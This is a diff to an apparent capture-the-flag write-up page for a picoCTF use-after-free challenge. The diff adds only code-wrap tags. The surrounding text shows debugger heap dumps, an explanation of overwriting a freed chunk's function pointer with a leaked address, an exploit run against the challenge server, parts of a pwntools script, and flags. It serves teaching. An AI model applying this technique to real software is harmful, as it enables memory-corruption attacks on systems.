@@ -28,6 +28,7 @@ layout:
 
 ## Source
 
+{% code overflow="wrap" %}
 ```c
 #include <ctype.h>
 #include <fcntl.h>
@@ -179,6 +180,7 @@ int main() {
   return 0;
 }
 ```
+{% endcode %}
 
 ## Solution
 
@@ -223,6 +225,7 @@ We can set some breakpoints in GDB:
 
 The **first breakpoint** shows the address of the `user` chunk (`0x95cd1a0`), returned to the `EAX` by malloc.
 
+{% code overflow="wrap" %}
 ```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
  EAX  0x95cd1a0 ◂— 0x0
@@ -249,47 +252,59 @@ The **first breakpoint** shows the address of the `user` chunk (`0x95cd1a0`), re
    0x8048d91 <main+92>    push   eax
    0x8048d92 <main+93>    call   doProcess                     <doProcess>
 ```
+{% endcode %}
 
 The chunk size is 16.
 
 0x11 is 17, but the 1 is a flag to indicate the previous chunk is not free.
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> x/8wx 0x95cd1a0 - 4
 0x95cd19c:	0x00000011	0x00000000	0x00000000	0x00000000
 0x95cd1ac:	0x00021e59	0x00000000	0x00000000	0x00000000
 ```
+{% endcode %}
 
 We'll create a user "crypto" and check the chunk again.
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> x/8wx 0x95cd1a0 - 4
 0x95cd19c:	0x00000011	0x080489f6	0x095ce1c0	0x00000000
 0x95cd1ac:	0x00001011	0x70797263	0x000a6f74	0x00000000
 ```
+{% endcode %}
 
 The next 4 bytes after the chunk size (`0x080489f6`) hold the `user->whatToDo` function pointer.
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> x 0x080489f6
 0x80489f6 <m>:	0x53e58955
 ```
+{% endcode %}
 
 The next 4 bytes after that hold the `user->username` char pointer.
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> x/gx 0x095ce1c0
 0x95ce1c0:	0x000a6f7470797263
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> unhex a6f7470797263
 
 otpyrc
 ```
+{% endcode %}
 
 **Second breakpoint**, after the user chunk has been freed.
 
+{% code overflow="wrap" %}
 ```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 *EAX  0x0
@@ -317,19 +332,23 @@ otpyrc
    0x8048b2d <printMenu>      push   ebp
    0x8048b2e <printMenu+1>    mov    ebp, esp
 ```
+{% endcode %}
 
 We can check the chunk data again.
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> x/8wx 0x95cd1a0 - 4
 0x95cd19c:	0x00000011	0x00000000	0x095cd010	0x00000000
 0x95cd1ac:	0x00001011	0x70790a59	0x000a6f74	0x00000000
 ```
+{% endcode %}
 
 Notice the `user->whatToDo` function pointer is now empty because the first word in a free chunk holds the previous free chunk's address (prev_ptr). However, the username remains.
 
 We can check the heap and see that our free chunk is in the `tcache`.
 
+{% code overflow="wrap" %}
 ```sh
 pwndbg> heap
 Allocated chunk | PREV_INUSE
@@ -353,9 +372,11 @@ Top chunk | PREV_INUSE
 Addr: 0x95ce228
 Size: 0x20dd9
 ```
+{% endcode %}
 
 **Third breakpoint**, after a new 8 byte chunk is allocated by malloc.
 
+{% code overflow="wrap" %}
 ```sh
 ─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 *EAX  0x95cd1a0 ◂— 0x0
@@ -381,9 +402,11 @@ Size: 0x20dd9
    0x8048a7a <leaveMessage+89>    mov    ebx, dword ptr [ebp - 4]
    0x8048a7d <leaveMessage+92>    leave
 ```
+{% endcode %}
 
 `malloc(8)` has returned `0x95cd1a0`, the same address as our previous chunk. Hence we are using-after-free when we write our message. We submit the leaked `hahaexploitgobrrr` function address, overwriting `user->whatToDo`. The infinite loop in main executes `doProcess(user)`, triggering the `hahaexploitgobrrr` function and printing the flag.
 
+{% code overflow="wrap" %}
 ```sh
 python exploit.py REMOTE mercury.picoctf.net 61817
 [+] Opening connection to mercury.picoctf.net on port 61817: Done
@@ -391,9 +414,11 @@ python exploit.py REMOTE mercury.picoctf.net 61817
 [!] picoCTF{d0ubl3_j30p4rdy_1e154727}
 [*] Closed connection to mercury.picoctf.net port 61817
 ```
+{% endcode %}
 
 ## Solution
 
+{% code overflow="wrap" %}
 ```py
 from pwn import *
 
@@ -453,5 +478,6 @@ io.sendlineafter(b':', flat(leak))
 # Got Flag?
 warn(io.recvlines(2)[1].decode())
 ```
+{% endcode %}
 
 Flag: `picoCTF{d0ubl3_j30p4rdy_ba307b82}`
